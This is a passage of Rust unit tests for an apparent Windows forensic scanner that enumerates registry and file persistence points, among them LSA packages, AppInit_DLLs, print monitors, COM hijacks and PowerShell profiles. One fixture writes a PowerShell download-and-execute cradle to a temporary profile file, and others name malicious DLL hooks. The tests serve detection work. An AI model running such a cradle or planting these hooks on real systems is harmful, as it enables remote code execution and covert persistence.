            .set(Hive::Hku, &key, "junk", s("ignored"))
            .set(Hive::Hku, &key, "url3", RegData::Other)
            .set(Hive::Hku, &key, "url0", s("ignored too"));
        let recs = read_typed_paths(&reg);
        let got: Vec<_> = recs
            .iter()
            .map(|r| (r.value.as_str(), r.mru_rank))
            .collect();
        assert_eq!(
            got,
            vec![("url1", Some(0)), ("url2", Some(1)), ("url10", Some(9))]
        );
        assert_eq!(recs[0].hive, r"HKU\s-1-5-21-1111-2222-3333-1001");
        assert_eq!(
            recs[0].key.to_ascii_lowercase(),
            TYPED_PATHS_KEY.to_ascii_lowercase()
        );
    }

    #[test]
    fn typed_paths_falls_back_to_hkcu() {
        let mut reg = FakeReg::default();
        reg.set(Hive::Hkcu, TYPED_PATHS_KEY, "url1", s(r"C:\Temp"));
        let recs = read_typed_paths(&reg);
        assert_eq!(recs.len(), 1);
        assert_eq!(recs[0].hive, "HKCU");
        assert_eq!(recs[0].mru_rank, Some(0));
    }

    #[test]
    fn run_mru_falls_back_to_hkcu() {
        let mut reg = FakeReg::default();
        reg.set(Hive::Hkcu, RUN_MRU_KEY, "a", s(r"cmd\1"));
        let recs = read_run_mru(&reg);
        assert_eq!(recs.len(), 1);
        assert_eq!(recs[0].hive, "HKCU");
    }

    #[test]
    fn empty_registry_yields_nothing() {
        assert!(read_catalog(&FakeReg::default(), r"C:\Windows").is_empty());
    }

    /// LSA Security Packages is REG_MULTI_SZ: one record per package, bare names
    /// resolved into System32 with `.dll`.
    #[test]
    fn lsa_multi_sz_yields_one_record_per_package() {
        let mut reg = FakeReg::default();
        reg.set(
            Hive::Hklm,
            LSA,
            "Security Packages",
            RegData::Multi(vec!["kerberos".into(), "mimilib".into(), "".into()]),
        );
        let recs = read_catalog(&reg, r"C:\Windows");
        let pkgs: Vec<_> = recs
            .iter()
            .filter(|r| r.mechanism == Mechanism::LsaSecurityPackage)
            .map(|r| (r.command.clone().unwrap(), r.binary_path.clone().unwrap()))
            .collect();
        assert_eq!(
            pkgs,
            vec![
                (
                    "kerberos".into(),
                    r"C:\Windows\System32\kerberos.dll".into()
                ),
                ("mimilib".into(), r"C:\Windows\System32\mimilib.dll".into()),
            ]
        );
    }

    /// AppInit_DLLs is a comma/space separated list in one REG_SZ.
    #[test]
    fn appinit_list_is_split() {
        let mut reg = FakeReg::default();
        reg.set(
            Hive::Hklm,
            r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows",
            "AppInit_DLLs",
            s(r"C:\ProgramData\a.dll, C:\Users\Public\b.dll"),
        );
        let recs: Vec<_> = read_catalog(&reg, r"C:\Windows")
            .into_iter()
            .filter(|r| r.mechanism == Mechanism::AppinitDlls)
            .collect();
        assert_eq!(recs.len(), 2);
        assert_eq!(
            recs[1].binary_path.as_deref(),
            Some(r"C:\Users\Public\b.dll")
        );
    }

    /// An empty AppInit_DLLs (the default) yields nothing.
    #[test]
    fn empty_value_yields_nothing() {
        let mut reg = FakeReg::default();
        reg.set(
            Hive::Hklm,
            r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows",
            "AppInit_DLLs",
            s(""),
        );
        assert!(read_catalog(&reg, r"C:\Windows").is_empty());
    }

    /// SubkeyValue walks children: each print monitor's Driver becomes a record.
    #[test]
    fn subkey_value_reads_each_child() {
        let mut reg = FakeReg::default();
        let base = r"SYSTEM\CurrentControlSet\Control\Print\Monitors";
        reg.set(
            Hive::Hklm,
            &format!(r"{base}\Local Port"),
            "Driver",
            s("localspl.dll"),
        )
        .set(
            Hive::Hklm,
            &format!(r"{base}\Evil"),
            "Driver",
            s(r"C:\Temp\evil.dll"),
        );
        let recs: Vec<_> = read_catalog(&reg, r"C:\Windows")
            .into_iter()
            .filter(|r| r.mechanism == Mechanism::PrintMonitor)
            .collect();
        assert_eq!(recs.len(), 2);
        let evil = recs
            .iter()
            .find(|r| r.value.as_deref() == Some("evil"))
            .unwrap();
        assert_eq!(evil.binary_path.as_deref(), Some(r"C:\Temp\evil.dll"));
    }

    /// HKCU COM hijack: CLSID\{guid}\InprocServer32 default value.
    #[test]
    fn com_hijack_reads_inproc_default() {
        let mut reg = FakeReg::default();
        reg.set(
            Hive::Hkcu,
            r"Software\Classes\CLSID\{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}\InprocServer32",
            "",
            s(r"C:\Users\v\AppData\Roaming\x.dll"),
        );
        let recs: Vec<_> = read_catalog(&reg, r"C:\Windows")
            .into_iter()
            .filter(|r| r.mechanism == Mechanism::ComHijack)
            .collect();
        assert_eq!(recs.len(), 1);
        assert_eq!(
            recs[0].binary_path.as_deref(),
            Some(r"C:\Users\v\AppData\Roaming\x.dll")
        );
    }

    /// Office Test uses the key's default value; the record labels it "(Default)".
    #[test]
    fn office_test_default_value_is_labelled() {
        let mut reg = FakeReg::default();
        reg.set(
            Hive::Hkcu,
            r"Software\Microsoft\Office test\Special\Perf",
            "",
            s(r"C:\Users\v\AppData\Roaming\perf.dll"),
        );
        let recs = read_catalog(&reg, r"C:\Windows");
        assert_eq!(recs.len(), 1);
        assert_eq!(recs[0].mechanism, Mechanism::OfficeTest);
        assert_eq!(recs[0].value.as_deref(), Some("(Default)"));
        assert_eq!(
            recs[0].location,
            r"HKCU\Software\Microsoft\Office test\Special\Perf"
        );
    }

    /// Non-string data (DWORD etc.) is never a command.
    #[test]
    fn non_string_data_is_skipped() {
        let mut reg = FakeReg::default();
        reg.set(Hive::Hklm, r"SOFTWARE\Microsoft\NetSh", "x", RegData::Other);
        assert!(read_catalog(&reg, r"C:\Windows").is_empty());
    }

    #[test]
    fn resolve_dll_handles_bare_env_and_absolute_names() {
        let root = r"C:\Windows";
        assert_eq!(
            resolve_dll("msv1_0", root),
            r"C:\Windows\System32\msv1_0.dll"
        );
        assert_eq!(
            resolve_dll("ifmon.dll", root),
            r"C:\Windows\System32\ifmon.dll"
        );
        assert_eq!(
            resolve_dll(r"%SystemRoot%\System32\w32time.dll", root),
            r"C:\Windows\System32\w32time.dll"
        );
        assert_eq!(resolve_dll(r#""C:\Temp\x.dll""#, root), r"C:\Temp\x.dll");
    }

    #[test]
    fn ps_profile_paths_cover_all_users_and_current_user() {
        let env = |k: &str| match k {
            "SystemRoot" => Some(r"C:\Windows".to_string()),
            "ProgramFiles" => Some(r"C:\Program Files".to_string()),
            "USERPROFILE" => Some(r"C:\Users\v".to_string()),
            _ => None,
        };
        let paths = ps_profile_paths(env, &[]);
        assert!(
            paths.contains(&r"C:\Windows\System32\WindowsPowerShell\v1.0\profile.ps1".to_string())
        );
        assert!(paths.contains(
            &r"C:\Users\v\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1".to_string()
        ));
        assert!(paths.contains(&r"C:\Program Files\PowerShell\7\profile.ps1".to_string()));
        assert_eq!(paths.len(), 8);
    }

    /// An existing profile becomes a ps_profile record carrying its text; a missing
    /// path is skipped.
    #[test]
    fn read_ps_profiles_reads_existing_files_only() {
        let dir = std::env::temp_dir().join("cairn_asep_profile_test");
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        let p = dir.join("profile.ps1");
        std::fs::write(
            &p,
            "\u{feff}IEX (New-Object Net.WebClient).DownloadString('http://x')",
        )
        .unwrap();
        let recs = read_ps_profiles(&[
            p.to_string_lossy().to_string(),
            dir.join("missing.ps1").to_string_lossy().to_string(),
        ]);
        let _ = std::fs::remove_dir_all(&dir);
        assert_eq!(recs.len(), 1);
        assert_eq!(recs[0].mechanism, Mechanism::PsProfile);
        assert!(recs[0].command.as_deref().unwrap().starts_with("IEX"));
    }

    /// Catalog mechanisms are the contract with cairn-heur: a typed, known mechanism
    /// whose serialized name stays lowercase snake_case.
    #[test]
    fn catalog_mechanisms_are_known_and_snake_case() {
        for s in CATALOG {
            assert_ne!(s.mechanism, Mechanism::Other);
            assert!(
                s.mechanism
                    .as_str()
                    .chars()
                    .all(|c| c.is_ascii_lowercase() || c == '_'),
                "{}",
                s.mechanism
            );
        }
    }
}
